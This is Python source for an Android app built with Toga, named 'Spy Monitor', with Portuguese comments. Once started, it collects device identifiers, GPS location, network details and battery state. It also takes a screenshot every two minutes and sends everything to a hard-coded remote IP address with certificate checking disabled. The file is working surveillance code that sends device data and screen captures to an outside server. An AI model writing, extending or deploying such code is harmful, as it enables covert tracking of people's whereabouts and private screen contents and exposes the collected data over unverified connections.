import toga
from toga.style import Pack
from toga.style.pack import COLUMN
import time
import datetime
import threading
import requests
import uuid
import platform
import os
import tempfile
import logging
import queue

# Verificar disponibilidade do rubicon-java
try:
    import rubicon.java
    RUBICON_AVAILABLE = True
except ImportError:
    RUBICON_AVAILABLE = False

# Configurações otimizadas
SERVER_URL = "https://147.79.111.118"
COLLECTION_INTERVAL = 120  # 2 minutos
REQUEST_TIMEOUT = 15

class SpyMonitor(toga.App):
    def __init__(self, formal_name="Spy Monitor", app_id="org.beeware.spymonitor"):
        super().__init__(formal_name=formal_name, app_id=app_id)

    def main_module(self):
        return "spymonitor.main"

    def startup(self):
        try:
            # Inicializar atributos otimizados
            self.device_id = self.get_device_id()
            self.is_monitoring = False
            self.collection_count = 0
            self.monitoring_thread = None
            self.data_queue = queue.Queue(maxsize=20)  # Fila menor para leveza
            self.last_collection = 0
            self.last_screenshot = 0
            self.send_thread = None

            # Inicializar APIs nativas do Android (apenas se disponível)
            if RUBICON_AVAILABLE and platform.system() == 'Android':
                self.init_android_apis()

            # Interface principal simplificada
            main_box = toga.Box(style=Pack(direction=COLUMN, padding=10))

            # Título
            title = toga.Label(
                "📱 Spy Monitor",
                style=Pack(padding=(0, 5), font_size=18)
            )
            main_box.add(title)

            # Status
            self.status_label = toga.Label(
                "Status: Parado",
                style=Pack(padding=(0, 5))
            )
            main_box.add(self.status_label)

            # Contador
            self.counter_label = toga.Label(
                "Dados enviados: 0",
                style=Pack(padding=(0, 5))
            )
            main_box.add(self.counter_label)

            # Botão principal
            self.monitor_button = toga.Button(
                "▶️ Iniciar Monitoramento",
                on_press=self.toggle_monitoring,
                style=Pack(padding=(5, 0))
            )
            main_box.add(self.monitor_button)

            # Botão de teste de conexão
            self.test_button = toga.Button(
                "🔍 Testar Conexão",
                on_press=self.test_connection_manual,
                style=Pack(padding=(5, 0))
            )
            main_box.add(self.test_button)

            # Logs simples
            self.log_label = toga.Label(
                "📝 Logs: Pronto",
                style=Pack(padding=(10, 5, 0, 5), font_size=12)
            )
            main_box.add(self.log_label)

            # Janela principal
            self.main_window = toga.MainWindow(title="Spy Monitor")
            self.main_window.content = main_box
            self.main_window.show()

            self.update_log("App inicializado")

        except Exception as e:
            # Interface de erro simplificada
            error_box = toga.Box(style=Pack(direction=COLUMN, padding=10))
            error_label = toga.Label(f"Erro: {str(e)[:50]}", style=Pack(padding=(0, 5)))
            error_box.add(error_label)

            self.main_window = toga.MainWindow(title="Erro")
            self.main_window.content = error_box
            self.main_window.show()

    def init_android_apis(self):
        """Inicializa APIs nativas do Android usando rubicon-java"""
        try:
            from rubicon.java import JavaClass

            # Inicializar classes Android
            self.Intent = JavaClass('android/content/Intent')
            self.IntentFilter = JavaClass('android/content/IntentFilter')
            self.BatteryManager = JavaClass('android/os/BatteryManager')
            self.LocationManager = JavaClass('android/location/LocationManager')

            self.update_log("APIs Android inicializadas")
        except Exception as e:
            self.update_log(f"Erro APIs Android: {str(e)[:20]}")

    def get_device_id(self):
        try:
            # ID único simples
            import hashlib
            unique_string = f"{platform.node()}-{platform.machine()}"
            return hashlib.md5(unique_string.encode()).hexdigest()[:15]
        except:
            return str(uuid.uuid4())[:15]

    def update_log(self, message):
        try:
            timestamp = datetime.datetime.now().strftime('%H:%M:%S')
            self.log_label.text = f"[{timestamp}] {message}"
        except:
            pass

    def restart_app(self, widget):
        """Reinicia o aplicativo"""
        try:
            self.main_window.close()
            app = SpyMonitor()
            app.main_loop()
        except:
            pass

    def toggle_monitoring(self, widget):
        if not self.is_monitoring:
            self.start_monitoring()
        else:
            self.stop_monitoring()

    def start_monitoring(self):
        try:
            self.is_monitoring = True
            self.status_label.text = "▶️ Ativo"
            self.status_label.style.color = '#27ae60'
            self.monitor_button.text = "⏹️ Parar Monitoramento"
            self.monitor_button.style.background_color = '#e74c3c'

            # Testar conexão
            if self.test_connection():
                self.update_log("🌐 Conectado ao servidor")

                # Iniciar monitoramento em thread
                self.monitoring_thread = threading.Thread(target=self.monitoring_loop, daemon=True)
                self.monitoring_thread.start()

                self.update_log("🚀 Monitoramento iniciado - Captura automática ativada")
            else:
                self.update_log("❌ Erro: Servidor indisponível")
                self.stop_monitoring()

        except Exception as e:
            self.update_log(f"❌ Erro ao iniciar: {str(e)[:30]}")
            self.stop_monitoring()

    def stop_monitoring(self):
        try:
            self.is_monitoring = False
            self.status_label.text = "⏹️ Parado"
            self.status_label.style.color = '#e74c3c'
            self.monitor_button.text = "▶️ Iniciar Monitoramento"
            self.monitor_button.style.background_color = '#27ae60'
            self.update_log("⏹️ Monitoramento parado")
        except:
            pass

    def test_connection(self):
        try:
            response = requests.get(f"{SERVER_URL}/", timeout=REQUEST_TIMEOUT, verify=False)
            return response.status_code == 200
        except:
            return False

    def test_connection_manual(self, widget):
        """Teste manual de conexão"""
        try:
            self.update_log("🔍 Testando conexão com servidor...")
            if self.test_connection():
                self.update_log("✅ Conexão OK - Servidor respondendo")
            else:
                self.update_log("❌ Falha na conexão - Verifique internet")
        except Exception as e:
            self.update_log(f"❌ Erro no teste: {str(e)[:30]}")

    def monitoring_loop(self):
        """Loop principal de monitoramento otimizado"""
        while self.is_monitoring:
            try:
                current_time = time.time()

                # Coleta de dados normal
                if current_time - self.last_collection >= COLLECTION_INTERVAL:
                    self.last_collection = current_time
                    self.collect_and_send_data()

                # Captura de screenshot a cada 2 minutos
                if current_time - self.last_screenshot >= COLLECTION_INTERVAL:
                    self.last_screenshot = current_time
                    self.take_screenshot()

                time.sleep(10)  # Sleep maior para estabilidade

            except Exception as e:
                self.update_log(f"Erro no loop principal: {str(e)[:30]}")
                time.sleep(15)

    def collect_and_send_data(self):
        """Coleta e envia dados de forma otimizada e leve"""
        try:
            collected_data = []

            # Dados básicos do dispositivo (sempre coletar - mais leve)
            device_data = {
                'imei': self.device_id,
                'timestamp': datetime.datetime.now().isoformat(),
                'platform': platform.system(),
                'version': platform.version()[:10] if platform.version() else 'Unknown'
            }
            collected_data.append(('device_info', device_data))

            # Coletar localização (menos frequente - economia de bateria)
            if self.collection_count % 3 == 0:  # A cada 3 coletas
                location = self.get_location()
                if location:
                    collected_data.append(('location', location))

            # Coletar informações de rede (menos frequente)
            if self.collection_count % 4 == 0:  # A cada 4 coletas
                network_info = self.get_network_info()
                if network_info:
                    collected_data.append(('network', network_info))

            # Coletar dados de bateria (menos frequente)
            if self.collection_count % 6 == 0:  # A cada 6 coletas
                battery_info = self.get_battery_info()
                if battery_info:
                    collected_data.append(('battery', battery_info))

            # Enviar dados coletados apenas se houver dados
            if collected_data:
                self.send_collected_data(collected_data)
                self.update_log(f"✅ {len(collected_data)} tipos enviados")
            else:
                self.update_log("ℹ️ Nenhum dado novo")

            self.collection_count += 1

        except Exception as e:
            self.update_log(f"❌ Erro na coleta: {str(e)[:25]}")

    def get_location(self):
        """Obtém localização do dispositivo usando rubicon-java"""
        try:
            if RUBICON_AVAILABLE and platform.system() == 'Android' and hasattr(self, 'LocationManager'):
                from toga_android import app as toga_app
                context = toga_app.context

                # Verificar permissão de localização
                if not self.check_location_permission():
                    self.update_log("Sem permissão GPS")
                    return None

                # Obter LocationManager
                location_manager = context.getSystemService(context.LOCATION_SERVICE)

                # Tentar obter última localização conhecida
                location = location_manager.getLastKnownLocation(location_manager.GPS_PROVIDER)

                if location:
                    return {
                        'latitude': location.getLatitude(),
                        'longitude': location.getLongitude(),
                        'accuracy': location.getAccuracy(),
                        'timestamp': datetime.datetime.now().isoformat()
                    }

            # Fallback para plyer
            elif platform.system() == 'Android':
                from plyer import gps

                # Configurar GPS
                gps.configure(on_location=self.on_location_update)
                gps.start(minTime=1000, minDistance=1)

                # Aguardar um pouco pela localização
                time.sleep(2)
                gps.stop()

                if hasattr(self, 'last_location'):
                    return self.last_location

            return None
        except Exception as e:
            self.update_log(f"Erro GPS: {str(e)[:20]}")
            return None

    def on_location_update(self, **kwargs):
        """Callback para atualização de localização"""
        self.last_location = {
            'latitude': kwargs.get('lat'),
            'longitude': kwargs.get('lon'),
            'accuracy': kwargs.get('accuracy'),
            'timestamp': datetime.datetime.now().isoformat()
        }

    def get_network_info(self):
        """Obtém informações de rede usando rubicon-java"""
        try:
            if RUBICON_AVAILABLE and platform.system() == 'Android':
                from toga_android import app as toga_app
                context = toga_app.context

                # Obter informações de conectividade
                connectivity_manager = context.getSystemService(context.CONNECTIVITY_SERVICE)
                network_info = connectivity_manager.getActiveNetworkInfo()

                network_data = {
                    'hostname': 'Android Device',
                    'local_ip': 'Unknown',
                    'network_type': 'Unknown',
                    'is_connected': False,
                    'timestamp': datetime.datetime.now().isoformat()
                }

                if network_info:
                    network_data['is_connected'] = network_info.isConnected()
                    network_data['network_type'] = network_info.getTypeName()

                    # Tentar obter IP local
                    try:
                        import socket
                        hostname = socket.gethostname()
                        local_ip = socket.gethostbyname(hostname)
                        network_data['hostname'] = hostname
                        network_data['local_ip'] = local_ip
                    except:
                        pass

                return network_data

            # Fallback para socket
            else:
                import socket
                hostname = socket.gethostname()
                local_ip = socket.gethostbyname(hostname)

                return {
                    'hostname': hostname,
                    'local_ip': local_ip,
                    'network_type': 'Unknown',
                    'is_connected': True,
                    'timestamp': datetime.datetime.now().isoformat()
                }
        except Exception as e:
            self.update_log(f"Erro rede: {str(e)[:20]}")
            return None

    def check_location_permission(self):
        """Verifica se tem permissão de localização"""
        try:
            from toga_android import app as toga_app
            context = toga_app.context

            permission = context.checkSelfPermission("android.permission.ACCESS_FINE_LOCATION")
            return permission == context.PERMISSION_GRANTED
        except:
            return False

    def get_battery_info(self):
        """Obtém informações da bateria usando rubicon-java"""
        try:
            if RUBICON_AVAILABLE and platform.system() == 'Android' and hasattr(self, 'BatteryManager'):
                from toga_android import app as toga_app
                context = toga_app.context

                # Criar intent para bateria
                intent_filter = self.IntentFilter(self.Intent.ACTION_BATTERY_CHANGED)
                battery_intent = context.registerReceiver(None, intent_filter)

                if battery_intent:
                    # Obter nível da bateria
                    level = battery_intent.getIntExtra(self.BatteryManager.EXTRA_LEVEL, -1)
                    scale = battery_intent.getIntExtra(self.BatteryManager.EXTRA_SCALE, -1)

                    if level >= 0 and scale > 0:
                        battery_level = (level / scale) * 100

                        # Verificar se está carregando
                        status = battery_intent.getIntExtra(self.BatteryManager.EXTRA_STATUS, -1)
                        is_charging = status == self.BatteryManager.BATTERY_STATUS_CHARGING or \
                                    status == self.BatteryManager.BATTERY_STATUS_FULL

                        return {
                            'level': int(battery_level),
                            'charging': is_charging,
                            'timestamp': datetime.datetime.now().isoformat()
                        }

            # Fallback para plyer
            elif platform.system() == 'Android':
                from plyer import battery
                battery_status = battery.status
                return {
                    'level': battery_status.get('percentage', 0),
                    'charging': battery_status.get('isCharging', False),
                    'timestamp': datetime.datetime.now().isoformat()
                }

            return None
        except Exception as e:
            self.update_log(f"Erro bateria: {str(e)[:20]}")
            return None

    def take_screenshot(self):
        """Captura screenshot automática a cada 2 minutos"""
        try:
            if platform.system() == 'Android':
                from plyer import screenshot

                # Criar arquivo temporário para screenshot
                temp_dir = tempfile.gettempdir()
                screenshot_path = os.path.join(temp_dir, f"screenshot_{int(time.time())}.png")

                # Capturar screenshot
                screenshot.take_screenshot(screenshot_path)

                if os.path.exists(screenshot_path):
                    # Enviar screenshot para servidor
                    self.upload_screenshot(screenshot_path)
                    self.update_log("📸 Screenshot capturado")
                else:
                    self.update_log("❌ Falha no screenshot")

        except Exception as e:
            self.update_log(f"Erro screenshot: {str(e)[:20]}")

    def upload_screenshot(self, screenshot_path):
        """Faz upload do screenshot para o servidor"""
        try:
            if os.path.exists(screenshot_path):
                with open(screenshot_path, 'rb') as f:
                    files = {'file': f}
                    data = {
                        'imei': self.device_id,
                        'tipo': 'screenshot',
                        'timestamp': time.time()
                    }

                    response = requests.post(
                        f"{SERVER_URL}/api/upload/",
                        files=files,
                        data=data,
                        timeout=REQUEST_TIMEOUT,
                        verify=False
                    )

                    if response.status_code == 200:
                        os.remove(screenshot_path)  # Remove arquivo após upload
                        self.update_log("✅ Screenshot enviado")
                    else:
                        self.update_log(f"⚠️ Upload erro: {response.status_code}")

        except Exception as e:
            self.update_log(f"❌ Erro upload: {str(e)[:20]}")

    def send_collected_data(self, data_list):
        """Envia dados coletados de forma otimizada"""
        for data_type, data in data_list:
            self.send_data_with_retry(data_type, data)

    def send_data_with_retry(self, data_type, data, retry_count=0):
        """Envia dados com mecanismo de retry otimizado"""
        try:
            # Mapeamento de URLs otimizado
            url_map = {
                'device_info': f"{SERVER_URL}/api/device-info/",
                'location': f"{SERVER_URL}/api/localizacao/",
                'network': f"{SERVER_URL}/api/atividade-rede/",
                'battery': f"{SERVER_URL}/api/device-info/"
            }

            url = url_map.get(data_type)
            if not url:
                return

            # Envio com timeout otimizado
            response = requests.post(url, json=data, timeout=REQUEST_TIMEOUT, verify=False)

            if response.status_code in [200, 201]:
                # Logs mais concisos
                if data_type == 'location':
                    self.update_log("📍 Localização OK")
                elif data_type == 'network':
                    self.update_log("🌐 Rede OK")
                elif data_type == 'battery':
                    nivel = data.get('level', data.get('bateria_nivel', 'N/A'))
                    self.update_log(f"🔋 Bateria: {nivel}%")
                # Device info não loga para reduzir verbosidade
            else:
                if retry_count < 3:  # Menos retries para leveza
                    delay = (2 ** retry_count) + 1
                    time.sleep(min(delay, 15))  # Máximo 15 segundos
                    self.send_data_with_retry(data_type, data, retry_count + 1)
                else:
                    self.update_log(f"⚠️ {data_type}: HTTP {response.status_code}")

        except requests.exceptions.Timeout:
            if retry_count < 3:
                delay = (2 ** retry_count) + 1
                time.sleep(min(delay, 15))
                self.send_data_with_retry(data_type, data, retry_count + 1)
            else:
                self.update_log(f"⏰ Timeout {data_type}")
        except requests.exceptions.ConnectionError:
            if retry_count < 3:
                delay = (2 ** retry_count) + 2
                time.sleep(min(delay, 15))
                self.send_data_with_retry(data_type, data, retry_count + 1)
            else:
                self.update_log(f"🔌 Conexão {data_type} falhou")
        except requests.exceptions.RequestException as e:
            if retry_count < 3:
                delay = (2 ** retry_count) + 1
                time.sleep(min(delay, 15))
                self.send_data_with_retry(data_type, data, retry_count + 1)
            else:
                self.update_log(f"❌ Erro {data_type}: {str(e)[:15]}")

def main():
    return SpyMonitor()

if __name__ == '__main__':
    app = SpyMonitor()
    app.main_loop()
